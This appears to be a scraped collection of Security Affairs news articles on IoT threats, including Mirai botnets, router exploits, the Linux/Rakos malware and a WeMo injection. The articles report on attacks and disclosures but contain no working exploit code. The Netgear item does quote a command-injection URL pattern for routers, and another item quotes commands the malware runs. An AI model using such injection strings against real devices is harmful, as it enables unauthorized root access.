When the Mirai bot infects a device, it chooses random IPs and attempts to log via the Telnet and SSH port using a list of admin credentials.\n\nThe Mirai botnet was used last year in two large attacks against the website of the popular investigator Brian Krebs and the Dyn DNS service. In October, the source of the Mirai bot was leaked online and new variants were spotted in the wild.\n\nA reference to the malicious code was spotted by Brian Krebs on the popular criminal hacker forum Hackforum. The Hackforum user with moniker \u201cAnna-senpai\u201d shared the link to the source code of the malware \u201cMirai.\u201d\n\nOn January 2017, experts spotted a new Windows variant of Mirai allegedly used to spread the Linux Trojan to more IoT devices.\n\nThe experts at Imperva speculate the attack was powered by a variant developed from the source code leaked. Previous versions of the Mirai botnet powered network layer DDoS attacks, the new variant launched an application layer assaults instead.\n\nThe experts determined that the botnet used to launch the attack was mostly composed of CCTV cameras, DVRs and routers. The researchers speculate the IoT devices might have been compromised by exploiting known vulnerabilities that the botnet exploited via open telnet (23) ports and TR-069 (7547) ports.\n\n\u201cBased on a number of signature factors, including header order, header values and traffic sources, our client classification system immediately identified that the attack emerged from a Mirai-powered botnet,\u201d continues the blog post published by Imperva.\n\nThe DDoS bots used in the attack used different user-agents instead the five previously seen hardcoded in the default Mirai version. The technical detail suggests the new variant of the Mirai botnet might have been improved to power more sophisticated application layer attacks.\n\n\u201cOverall, in the course of the attack, we spotted the following 30 user-agent variants\u201d continued the post.\n\nThe analysis of the traffic originating from 9,793 IPs worldwide, revealed that more than 70% of the devices were located in the following countries: United States (18.4%), Israel (11.3%), Taiwan (10.8%), India (8.7%), Turkey (6%), Russia (3.8%), Italy (3.2%), Mexico (3.2%), Colombia (3.0%), and Bulgaria (2.2%).\n\n\u201cLess than a day after the initial assault ended, another one began that lasted for an hour and a half with an average traffic flow of 15,000 RPS. Based on our experience, we expect to see several more bursts before the offender(s) finally give up on their efforts,\u201d concluded the post.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Mirai botnet, DDoS)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai", "topic_name": "Mirai"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai-botnet", "topic_name": "Mirai botnet"}]}, {"news_name": "Miele Professional PG 8528 washer-disinfector affected by a Web Server Directory Traversal", "news_link": "https://securityaffairs.co/wordpress/57457/iot/mele-washer-disinfector-flaw.html", "title": "Miele Professional PG 8528 washer-disinfector affected by a Web Server Directory Traversal\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 27, 2017", "body": "While the number of IoT devices continue to exponentially increase, the level of security of these smart objects is often not adequate end exposes users at risk of cyber attacks.\n\nThe news of the say is a security vulnerability reported at Full Disclosure that affects Internet-connected washer-disinfector appliance manufactured by the Germany-based vendor Miele.\n\nAccording to the security advisory, the Miele Professional PG 8528 appliance is affected by a Web Server Directory Traversal vulnerability tracked as CVE-2017-7240.

Moreover, it reports about threat agents their motivations, and how their practices, tools and techniques have advanced.\u201d read an introduction to the report.\n\nThe ENISA Threat Landscape Report 2016 is an impressive source of data and references to the events that characterized the threat landscape in 2016.\n\nThe vast majority of the attacks was financially and politically motivated, the year 2016 is thus characterized by \u201cthe efficiency of cyber-crime monetization.\u201d Crooks have monetized their effort not only with the illegal activities they conducted but also offering their services through the consolidated model of sale known as \u201ccrime-as-a-service.\u201d\n\nFortunately, we are observing an increasing maturity of defenders when dealing cyber threats and a successful effort of international law enforcement agencies that conducted many operations disrupting criminal organizations.\n\nHowever, attackers are still one step ahead as explained in the report. The advances of defenders have been the result of the superiority of attackers in:\n\nMalware remains the principal cyber-threat in 2016, the number of samples reached ca. 600 million per quarter, mobile malware (reaches a growth of ca. 150%) and ransomware have monopolized the threat landscape. Web based attacks and web application attacks follow malware in the Top 15, no change has been observed respecting 2015.\n\nWeb based attacks include malicious URLs, compromised domains, browser exploits and drive-by attacks.\n\n\u201cWeb based attacks are those that use web components as an attack surface. As web components we understand parts of the web infrastructure, such as web servers, web clients (browsers) content management systems (CMS) and browser extensions\u201d states the report.\n\nThe category of web application attacks includes classic techniques like cross-site scripting and SQL-injection (SQLi) that anyway continues to be a privileged attack vector of threat actors.  In the fourth place there are the Botnets, these infrastructures are an essential component for a large number of cyber attacks.\n\nThe DDoS attacks reached the fourth place, it is the result of extortion activities and the availability in the criminal underground of DDoS-for-hire services that offer to wannabe hackers all the necessary to launch powerful attack.\n\n\n\nThe report also provides an interesting analysis of top threat actors observed in 2016, Cyber-criminals, insiders, cyber spies, hacktivists, cyber fighters, cyber terrorists and script kiddies operate with different techniques, but in many cases the observed an overlap of their TTPs caused by the evolution of the crime-as-service model.\n\nThe ENISA Threat Landscape Report 2016 also associated the various threat to the above threat agents, an interesting exercize that allowed us to better profile the attackers.\n\n\n\nBased on the material ENISA\u2019s experts collected, the report provided our conclusions for policy makers, businesses, and research.\n\n\u201cAs we speak, the cyber-threat landscape is receiving significant high-level attention: it is on the agenda of politicians in the biggest industrial countries. This is a direct consequence of \u2018cyber\u2019 becoming mainstream, in affecting people\u2019s opinions and influencing the political environment of modern societies.

The researchers discovered an iWatch Install.php root command execution issue.\n\n\u201cThe iWatch Install.php vulnerability can be exploited by crafting a special filename which is then stored within a tar command passed to a php system() call,\u201d researchers explained. \u201cBecause the web-server runs as root, the filename is user supplied, and the input is used without sanitization, we are able to inject our own commands within to achieve root remote command execution.\u201d\n\n\n\nResearchers at Exploitee.rs have also released a proof-of-concept (PoC) code for the vulnerability, and a fix. The exploit works with the SNH-1011 model, but researchers believe all Samsung SmartCam devices are affected.\n\n\u201cThe vulnerability can be patched by first logging in to the server after spawning a shell with the POC curl command above, then running the following command.\u201d\n\nResearchers have warned that enabling the web interface reintroduces some of the older vulnerabilities previously discovered.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Samsung SmartCam, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rce", "topic_name": "RCE"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/samsung-smartcam", "topic_name": "Samsung SmartCam"}]}, {"news_name": "FTC filed a lawsuit against D-Link over failure to secure its IoT devices", "news_link": "https://securityaffairs.co/wordpress/55138/laws-and-regulations/d-link-lawsuit.html", "title": "FTC filed a lawsuit against D-Link over failure to secure its IoT devices\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 7, 2017", "body": "The U.S. Federal Trade Commission (FTC) has filed a lawsuit against the Taiwanese firm D-Link, over failure to secure its IoT products, including IP cameras and routers.\n\n\u201cHackers are increasingly targeting consumer routers and IP cameras \u2014 and the consequences for consumers can include device compromise and exposure of their sensitive personal information,\u201d said Jessica Rich, director of the FTC\u2019s Bureau of Consumer Protection. \u201cWhen manufacturers tell consumers that their equipment is secure, it\u2019s critical that they take the necessary steps to make sure that\u2019s true.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 D-Link, security)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/d-link", "topic_name": "D-Link"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ftc", "topic_name": "FTC"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot-devices", "topic_name": "IoT devices"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/lawsuit", "topic_name": "lawsuit"}]}, {"news_name": "It has happened again, ransomware infected an LG Smart TV", "news_link": "https://securityaffairs.co/wordpress/54991/malware/lg-smart-tv-ransomware.html", "title": "It has happened again, ransomware infected an LG Smart TV\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 3, 2017", "body": "IoT Ransomware is a scaring reality, the threat will increase in the next months and security firms have been warning IT industry.

Remote attacks against WNR2000v5 routers would be possible if a user had manually enabled remote administration.\n\nThe expert explained that the NETGEAR WNR2000 router allows an administrator to perform sensitive actions by invoking the CGI apply.cgi URL on the web server on the device. The URL is exposed by the embedded web server uhttpd .

The malicious code is written in the Go language and the binary is usually compressed with the standard  UPX tool.\n\nApparently, frustrated users complain more often recently on various forums about their embedded devices being overloaded with computing and network tasks.\n\nThe attack is carried out via brute force attempts at SSH logins like many other Linux malware, including Linux/Moose. The new Linux/Rakos is able to compromise both embedded devices and servers with an open SSH port which is protected by an easy-to-guess password. The malware once compromised a device is able to recruit is in a botnet that could be abused for several malicious activities. The malware starts scanning the internet from a limited list IP addresses, then it spreads incrementally to more targets.\n\nIn some cases, attackers were able to compromise devices protected with a strong password that anyway had online service enabled and it was reverted to a default password after a factory reset.\n\nThe attack chain starts with the loading of a configuration file via standard input (stdin) in YAML format, the file contains information like lists of C&Cs, all the list of credentials to use in the brute force attacks against targets devices.\n\nAn example of Linux/Rakos configuration is available on ESET\u2019s Github: https://github.com/eset/malware-ioc/tree/master/rakos.\n\n\n\nAs the second step, the malware starts a local HTTP service available at http://127.0.0.1:61314.\n\n\u201cThere are two reasons why this is installed: the first is as a cunning method for the future versions of the bot to kill the running instances regardless of their name by requesting http://127.0.0.1:61314/et; second, it tries to parse a URL query for parameters \u201cip\u201d, \u201cu\u201d, \u201cp\u201d by requesting http://127.0.0.1:61314/ex. The purpose of this /ex HTTP resource is still unclear at the time of writing and it seems not to be referenced elsewhere in the code.\u201d reads the analysis published by ESET.\n\nExperts from ESET also noticed that Linux malware creates a web server listening on all interfaces.\n\nThe bot scans the SSH service on various IP addresses obtained from the C&C server. Malware researchers also noticed that previous versions of the trojan also scanned for the SMTP service, a feature that is disabled in current versions.\n\nWhen the malware is able to access a device with its credentials it runs two commands (id, uname -m). Then the malicious code checks whether if it is possible to upload to the new victim and goes on.\n\nThe backdoor is able to update the configuration file (from https://{C&C}/upgrade/vars.yaml) and also to upgrade itself.\n\nThe Linux/Rakos isn\u2019t able to maintain persistence after the system is rebooted.

DNSChanger attacks internet routers via potential victims\u2019 web browsers; the EK does not rely on browser or device vulnerabilities but rather vulnerabilities in the victims\u2019 home or small office (SOHO) routers. \u201d states the analysis published by ProofPoint. \n\nThe malware is used in malvertising campaigns and targets home routers.\n\nWhen a victim clicks on a malicious link the malware, differently from most exploit kits in the wild, doesn\u2019t attack the operating system or the browser but the home or small office router.\n\nOnce the router is compromised the victim\u2019s internet traffic can be routed to any possible phishing sites and the victim could remain under constant malvertising attack that would help criminal to increase the damage they cause.\n\nThe similarities this attack campaign has with the \u201cCSRF Soho Pharming\u201d campaign uncovered at the beginning of 2015 suggests the same actors could be behind this new view of the attack. However, researchers note that several improvements were made to the exploit kit, which renders it more dangerous.\n\n\u201cAttack pattern and infection chain similarities led us to conclude that the actor behind these campaigns was also responsible for the \u201cCSRF (Cross-Site Request Forgery) Soho Pharming\u201d operations in the first half of 2015 [1].\u201d continues the analysis.\n\nThe new version includes some additional features such as;\n\n\n\nThe victim is initially compromised by advertisements on legitimate websites. Once the malware is installed on the victim\u2019s browser (Chrome for Windows and Android), it tries to locate and identify the router.

The exploit kit makes extensive use of steganography techniques such as HTML code hidden in the comment field of a PNG file.\n\nDNSChanger seems to target large ad agencies by redirecting their traffic to other third party ad services.\n\nThe malware can currently exploit a large number of different router make and models including the following newly added exploits;\n\nThere are currently no real effective mitigation techniques for this attack except making sure the router firmware is updated to the latest version.\n\nAny attack compromising the DNS on any network can provide the attacker with a wide range of new attack vectors including man-in-the-middle, frauds, and phishing attacks.\n\nWritten by:  Alper Ba\u015faran\n\nAbout the Author: Alper Ba\u015faran is a Hacker and Penetration Tester \u2013 Buccaneer of the Interwebs, he owns the Turkish blog alperbasaran.com.\n\nAlper Basaran provides business process focused and goal oriented penetration testing services to his customers.

A LAN-based attacker may do the same by issuing a direct request.\n\nThe advisory states that in order to exploit the flaw, the victim could visit a website like:\n\nhttp://<router_IP>/cgi-bin/;COMMAND\n\nthen the malicious commands would execute automatically with root privileges.\n\n\n\nThe code exploit for this vulnerability has been publicly released.\n\nAt the time I was writing there is no available fix for the issue neither a workaround, for this reason, the CERT strongly recommended Netgear users to \u201cconsider discontinuing use\u201d of vulnerable Netgear R7000 and R6400 routers, until a patch is released by the company.\n\n\u201cExploiting this vulnerability is trivial.

Deutsche Telekom and router vendors are working together to develop a firmware fix and roll out the software patch.\n\nDeutsche Telekom is currently rolling out firmware updates.\n\n\u201cThe massive interference from connections of Deutsche Telekom, according to findings from the Federal Office for Security in Information Technology (BSI), follow a worldwide attack.\u201d reads the abendblatt.de.\n\n\u201cAccording to BSI, the attacks were also noticeable in the government-protected government network, but could be repelled with effective protection measures. \u201c\n\nDeutsche Telekom customer case recommended that users unplug their devices, wait for 30 seconds and restart their router. In case this procedure is not able to restore the connectivity it is suggested to permanently disconnect the router from the Deutsche Telekom network.\n\n\u201cGerman Telekom is now offering a firmware update for the affected routers. Details (in German) are here: https://www.telekom.de/hilfe/geraete\u2013zubehoer/router/speedport-w-921v/firmware-zum-speedport-w-921v. Affected user are advised to power off their router and power it on again after 30 seconds. During bootup the router should retrieve the new firmware from the Telekom servers.\u201d reported the SANS Institute.\n\nDeutsche Telekom is offering free mobile Internet until the technical problem is resolved.\n\nDeutsche Telekom didn\u2019t provide further technical details about the alleged cyber attack either the affected router models.\n\nIt is not clear which is the threat that compromised the Deutsche Telekom routers, experts speculated the involvement of a malware that could have prevented equipment from connecting to the company\u2019s network.\n\nSecurity experts from ISC Sans published an interesting report that revealed a significant increase in scans and exploitation attempts for a SOAP Remote Code Execution (RCE) vulnerability via port 7547 against Speedport routers.\n\nThis specific model of routers is widely used by Deutsche Telekom for German users.\n\n\u201cFor the last couple days, attack against port 7547 have increased substantially. These scans appear to exploit a vulnerability in popular DSL routers. This issue may already have caused severe issues for German ISP Deutsche Telekom and may affect others as well (given that the US is just \u201cwaking up\u201d from a long weekend). For Deutsche Telekom, Speedport routers appeared to be the main issue.\u201d added the ICS SANS. \n\n\u201cAccording to Shodan,  about 41 Million devices have port 7547 open. The code appears to be derived from Mirai with the additional scan for the SOAP vulnerability. Currently, honeypots see about one request every 5-10 minutes for each target IP.\u201d\n\nAccording to the ICS SANS report, it seems that attackers tried to exploit a common vulnerability in the TR-069 configuration protocol. Experts highlighted the availability of a Metasploit module implementing the exploit for this vulnerability.\n\nAn unconfirmed List of vulnerable routers includes the Eir D1000 Wireless Router (rebranded Zyxel Modem used by Irish ISP Eir) and the Speedport Router (Deutsche Telekom).\n\nOf course. when dealing with IoT devices and cyber threats, the most dreaded malware is the Mirai bot that was recently involved in several massive DDoS attacks.\n\nAccording to BadCyber, the responsible is the Mirai botnet that was designed to exploit Eir D100 (Zyxel Modems) via port 7547.\n\n\u201cTR-064 protocol is based on HTTP and SOAP and its default port is TCP 7547. Commands are sent as POST requests to this port.\u201d states the BadCyber. \n\n!The malware itself is really friendly as it closes the vulnerability once the router is infected. It performs the following command:\n\nbusybox iptables -A INPUT -p tcp \u2013destination-port 7547 -j DROP\n\nbusybox killall -9 telnetd\n\nwhich should make the device \u201csecure\u201d, unless until next reboot. The first one closes port 7547 and the second one kills the telnet service, making it really hard for the ISP to update the device remotely.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Deutsche Telekom, IoT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/deutsche-telekom", "topic_name": "Deutsche Telekom"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/germany", "topic_name": "Germany"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}]}, {"news_name": "Hackers offer a huge Mirai botnet as a DDoS-for-hire service", "news_link": "https://securityaffairs.co/wordpress/53824/cyber-crime/mirai-botnet-ddos-for-hire.html", "title": "Hackers offer a huge Mirai botnet as a DDoS-for-hire service\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 27, 2016", "body": "We have written a lot about the Mirai botnet after the clamorous attacks against the Dyn DNS service and the OVH hosting, it is a dangerous threat that was designed to target IoT devices that could be used to power massive DDoS attacks.\n\nThe Mirai botnet is becoming very popular in the criminal underground, so it is natural that crooks started offering it as a DDoS hire service to other cyber criminals.\n\nThe hackers Popopret and BestBuy are offering a DDoS-for-hire service leveraging a Mirai botnet composed of around 400,000 compromised devices.\n\nWe recognize BestBuy as the author of the GovRAT malware that offered the source code of his threat, including a code-signing digital certificate, for nearly 4.5 Bitcoin on the TheRealDeal black market.\n\nPopopret was linked by experts from threat intelligence firm InfoArmor to Bestbuy, the researchers pointed out that Bestbuy started using also the moniker \u201cPopopret.\u201d\n\nThe RAT was delivered through spear-phishing and drive-by downloads attacks. Among the victims, government and military organizations. Stolen data from military organizations were also offered for sale on the black market.\n\nCatalin Cimpanu from Bleeping Computer published an interesting post that confirms that the two monikers Popopret and BestBuy (it is not clear if they are the same person) are renting access to a Mirai botnet composed of more than 400,000 infected bots, the largest one till date offered for rent.\n\n\u201cTwo hackers are renting access to a massive Mirai botnet, which they claim has more than 400,000 infected bots, ready to carry out DDoS attacks at anyone\u2019s behest.\u201d wrote Cimpanu.\n\nThis botnet offered by Popapret and BestBuy represents an evolution of the original Mirai botnet because it included new features like SSH supported brute-force attacks to exploit zero-day vulnerabilities.\n\nThe experts at the Bleepingcomputer highlighted the fact that this Mirai botnet isn\u2019t cheap because Popopret requests its customers to rent it for a minimum period of two weeks.\n\n\u201cPrice is determined by amount of bots (more bots more money), attack duration (longer = more money), and cooldown time (longer = discount),\u201d Popopret told Bleeping Computer.\n\nCustomers could get a discount if they rent the Mirai botnet for long DDoS cooldown time, which is the time between two consecutive DDoS attacks.\n\n\u201cDDoS botnets use cooldown times to avoid maxing out connections, filling and wasting bandwidth, but also preventing devices from pinging out and disconnecting during prolonged attack waves.\u201d reported BleepingComputer.\n\nPopopret provided an example of price for this Mirai Botnet, 50,000 bots with attack duration of 3600 secs (1 hour) and 5-10 minute cooldown time goes for roughly 3-4k per 2 weeks. The experts highlighted that the service is very expensive.\n\nThe botnet is controlled through a console hidden on the Tor network that could be accessed via Telnet.\n\nSource: Bleeping Computer\n\nThe hackers Popopret and BestBuy declined to run a test in order to show real capabilities of their botnet.\n\nYou can monitor the Mirai botnet with the following tracker.\n\nhttps://intel.malwaretech.com/botnet/mirai\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Mirai botnet, IoT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai", "topic_name": "Mirai"}]}, {"news_name": "How to Exploit Belkin WEMO gear to hack Android devices", "news_link": "https://securityaffairs.co/wordpress/53131/hacking/belkin-wemo-hack.html", "title": "How to Exploit Belkin WEMO gear to hack Android devices\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 6, 2016", "body": "Belkin\u2019s WeMo home automation firmware that\u2019s in use in its light bulbs, switches, security cameras, coffee makers and room heaters has recently been found vulnerable to an SQL injection.\n\nThe hack allows root privileges to a third party, which already has access to the devices\u2019 local network.\n\nResearchers at Virginia based Invincea Labs discovered the vulnerability and also warned of a related knock on exploit path which allows for compromise of the Android device used to control the Belkin home automation systems.\n\nThe flaw exploits a weakness in field validation by allowing a threat actor to inject malicious JavaScript via the device name field.\n\nScott Tenaglia, Research Director at Invincea stated that the flaws were previously unknown and not linked to earlier flaws in the WeMo home automation products.\n\nInvincea Labs privately disclosed the flaws on Thursday the 11th of August with Belkin publicly announcing the vulnerability the next day.\n\nOn September the 1st, Belkin released a patch, which remedied the code injection vulnerability on the Android app. A further patch was released by Belkin to fix the WeMo appliances on November the 1st\n\nIt\u2019s unknown how many WeMo products are vulnerable to this particular weakness, however, in 2015 it was reported that Belkin WeMo had approximately 1.5 million products in use.\n\nResearchers at Invincea stated that every one of their devices that allow for remote control or administration is vulnerable to the attack.\n\nIn order to exploit this particular set of vulnerabilities, a malicious actor would first have to gain access to the local network where the smart devices were located. They would then have to leverage the shared network infrastructure in order to move the malicious code from their entry point to the vulnerable devices.\n\nAccording to Tenaglia \u201cThe goal of the attacker is to hop from one device \u2013 a PC that can be later disinfected \u2013 to another device that can\u2019t be protected \u2013 such as an IoT device,\u201d. He then went on to explain, \u201cOnce the attacker has access to the IoT device they can do whatever they want from downloading Mirai-type malware for creating a botnet or just control the device in question. They can also infect or re-infect any PC on the same network with malware of their choice.\u201d\n\nInvincea Labs tested their concept by infecting a WeMo device with a malicious PowerShell script and from there open a telnet connection on the device and have it supply a root shell to requesters.\n\nTenaglia also stated that once infected the device could be configured to deny requests to patch the system and default setting reset attempts unless patched with the recently released firmware update.\n\nOnce the access had been granted the researchers found that the attack could progress to target Android devices running the WeMo app used to control the home automation devices.\n\n\u201cThis is the first time anyone has discovered a way for IoT devices to hack your phone\u201d, according to Tenaglia.\n\n\n\nThe vulnerability affects devices by placing unsanitized JavaScript into the name fields of the device, instead of only being recognized as a string the malicious code is executed instead.\n\n\u201cEvery WeMo device can be assigned a name. What we found is you can set the name property in the device to a malicious string. The malicious string contains JavaScript code. And when the Android app requests the name of the devices it needs to connect to, it will download the malicious JavaScript code that is the name of the device, and execute the code,\u201d\n\nUtilizing the hack in the lab environment Tenaglia reported that they were able to both access the photo gallery on the phone as well as activate the GPS beaconing system, allowing third parties to track and locate the device.\n\n\u201cAll this hack allows us to do is run code in the context of the WeMo app. We do not have root access to the phone,\u201d Tenaglia said. Furthermore, access to the Android device is limited to only when the app is active or running in memory on the phone. Once the WeMo remote app is shut down, access is terminated. \u201cWhat we have is an in-memory infection. The code does not persist on the phone when you force quit the app. However the name of the device is still that malicious string. So when you connect to that device again the reinfection occurs,\u201d\nWritten by: Steven Boyd\n\n\n\n\nSteven is a security consultant, researcher, ethical hacker and freelance writer with over 16 years of experience in the industry.

Liberia has one internet cable, installed in 2011, which provides a single point of failure for internet access. From monitoring we can see websites hosted in country going offline during the attacks \u2014 additionally, a source in country at a Telco has confirmed to a journalist they are seeing intermittent internet connectivity, at times which directly match the attack. The attacks are extremely worrying because they suggest a Mirai operator who has enough capacity to seriously impact systems in a nation state.\u201d Beaumont wrote in a blog post.\n\nThe Botnet #14 was able to generate a volume of traffic greater than 500 Gbps, enough to cause a massive outage in a country like Liberia.\n\n\u201cFrom monitoring, we can see websites hosted in country going offline during the attacks,\u201d Beaumont added.\n\nUnfortunately, it is becoming quite easy to create or rent a botnet powered by the Mirai malware due to the availability of its source code leaked online by the alleged author.\n\nAccording to Flashpoint who scanned the Internet with the Shodan search engine for flawed IoT devices more than 500,000 vulnerable devices are in the wild. The countries with the highest number of vulnerable devices are Vietnam (80,000), Brazil (62,000) and Turkey (40,000).\n\n\n\nLarge-scale DDoS attacks continue to represent a serious threat for web services across the world, and IoT devices represent a privileged attack vector due to the lack of security by design.

The threat is seriously powerful, as per I firstly mentioned in the Security Affair interview. The way to stop it, are, either we push the effort to arrest \u2018skiddes\u2018 who related to this botnet, and more strict in rule/policy for DDoS abuses, or, put down be more aggressive to take down infected IoT devices. Seriously, time is critical yet many ppl still not acting faster, if we let this happen with the current pace, in this Christmas or new year some countries and services can be shut down too \u2026 and they can do that.\n\nQ: Is it possible to use Mirai to shut down a country like the UK or France?\n\nA: If they know which point to attack, YES. They caused a major Internet outage in the United States for some hours, and the US have the strongest internet backbone in this planet.\n\nIt is my personal opinion that who released the code online was trying to rapidly increase the size of Mirai botnet. More smoking guns make harder the attribution and this could help crooks to keep lower their profile and nation-state hackers make impossible the attribution of the attacks even against a foreign country.\n\nIt is clear that someone is using the Botnet #14 to test a large scale attack probably against some Government.\n\nWe have no time, we need a new approach to cyber security, IoT device need security by design.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Shadows Kill Botnet #14, Mirai botnet)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet-14", "topic_name": "Botnet #14"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/liberia", "topic_name": "Liberia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai-botnet", "topic_name": "Mirai botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/shadows-kill", "topic_name": "Shadows Kill"}]}, {"news_name": "Hacking back the Mirai botnet, technical and legal issues", "news_link": "https://securityaffairs.co/wordpress/52821/hacking/mirai-botnet-2.html", "title": "Hacking back the Mirai botnet, technical and legal issues\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 29, 2016", "body": "The Mirai botnet, this name is familiar to security experts due to the massive DDoS attack that it powered against the Dyn DNS service a few days ago.\n\nThe Mirai malware was first spotted by the researcher MalwareMustDie that confirmed it was designed to hack into poorly configured and vulnerable IoT devices. Its source code was leaked on the popular criminal hacker forum Hackforum by a user with moniker \u201cAnna-senpai\u201d giving the opportunity to anyone to compile and customize its own version of the threat.\n\nExperts who reviewed the code have discovered a weakness that could be exploited to shut down the botnet stopping it from flooding the targets with HTTP requests, this means that it is possible to hack back the threat. The experts from Invincea discovered three vulnerabilities in the Mirai code, one of them, a stack buffer overflow, could be exploited to halt the DDoS attack powered by the botnet. The buffer overflow vulnerability affects the way Mirai parses responses from HTTP packets.\n\n\u201cPerhaps the most significant finding is a stack buffer overflow vulnerability in the HTTP flood attack code. When exploited it will cause a segmentation fault (i.e. SIGSEV) to occur, crash the process, and therefore terminate the attack from that bot. The vulnerable code has to do with how Mirai processes the HTTP location header that may be part of the HTTP response sent from an HTTP flood request.\u201d reported the analysis published by the security firm Invincea.\n\n\n\nThe researchers highlighted that their attack would not have helped in the DNS-based DDoS attack against provider Dyn, but it would halt the Layer 7 attack capabilities of the Mirai botnet implemented in the coded leaked online.\n\nThe researchers at Invincea successfully tested a proof-of-concept exploit in a virtual environment setting up a debug instance of the Mirai bot, a command and control server and a target machine.\n\n\u201cThis simple \u201cexploit\u201d is an example of active defense against an IoT botnet that could be used by any DDoS mitigation service to defend against a Mirai-based HTTP flood attack in real-time. While it can\u2019t be used to remove the bot from the IoT device, it can be used to halt the attack originating from that particular device. Unfortunately, it\u2019s specific to the HTTP flood attack, so it would not help mitigate the recent DNS-based DDoS attack that rendered many websites inaccessible.\u201d explained the Scott Tenaglia, Research Director in the cyber capabilities team at Invincea Labs.\n\nTenaglia remarked that the method proposed by the company doesn\u2019t clean the compromised devices, instead it could be effective against HTTP flooding powered by the Mirai Botnet.\n\nThe method proposed by the researchers is a form of active defense that has important legal implications because anyway, who is defending its system from the attack power a response attack against the attacker\u2019s infrastructure.\n\nHacking back is illegal under the Computer Fraud and Abuse Act.\n\nHacking a bot means to make an unauthorized access to a computer system and such kind of operations have to be authorized by a court order.\n\nInvincea has made an excellent work and isn\u2019t suggesting the hacking back, but limited its analysis on the technical aspect of the Mirai botnet and its vulnerabilities.\n\n\u201cIt\u2019s in the gray space of active defense,\u201d Tenaglia told to ThreatPost. \u201cIn the defense world, this is a hotly contested issue. Say if your IoT is already compromised and bad code is already running, if I do something to the bad guy\u2019s code, am I breaking law?\u201d\n\n\u201cI would never comment on the legality of this,\u201d Tenaglia said. \u201cI think this gives us another point to discuss with regard to active defense. Is this something we think is ok? I don\u2019t think it would hurt the system; it might help it. If a bot is degrading performance of the Internet connection because of the packets it\u2019s sending out, and if this attack kills the process and the connection gets better, have we helped you?

My intention is that every person takes their own conclusions about the risks that everybody assumes every time we connect our devices to the internet.\n\nHave you ever wondered happens in your home router and that threats lurk in the moment you press the power button?\n\nIn this article, I intend to analyze the attacks and the cybersecurity events I have received in my personal router in Spanish ISP. This information may lead you to become aware of the high risk of having these devices connected to the web, even when we expose our lives on social media.\n\nI have exposed my personal router to possible attacks because home routers haven\u2019t been receiving the appropriate attention and, in some cases, people use to let them on during the entire year. People use to let these devices completely exposed and they don\u2019t realize that sometimes administrator control panel is vulnerable and they are vulnerable to certain attacks or have different security flaws that have not been patched or by our Internet provider or by the device manufacturer.\n\nWe recommend you to visiting http://routersecurity.org/ to find more information about bugs and detected vulnerabilities in the last years to home routers and some recommendations.\n\n\n\nIn recent years, there has been news about vulnerabilities in routers distributed in Spain that show the seriousness of the matter:\n\nWhat if an attacker gains access to the DNS settings of your router and modifies it?\n\nIt is not just about losing our privacy (because a cybercriminal could monitor your internet navigation); it is about letting an attacker to theft your identity, for example, in your personal bank or company website to obtain your credentials. This is just an example of what could really happen.\n\n\n\nIn many 